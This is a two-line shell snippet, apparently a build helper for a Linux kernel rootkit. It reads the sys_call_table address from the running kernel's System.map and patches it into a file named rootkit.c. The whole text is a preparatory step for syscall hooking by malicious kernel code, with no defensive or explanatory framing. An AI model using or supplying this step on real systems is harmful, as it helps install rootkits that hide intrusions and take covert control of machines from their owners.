TABLE=$(grep " sys_call_table" /boot/System.map-$(uname -r) | awk '{print $1;}')
sed -i s/TABLE/$TABLE/g rootkit.c
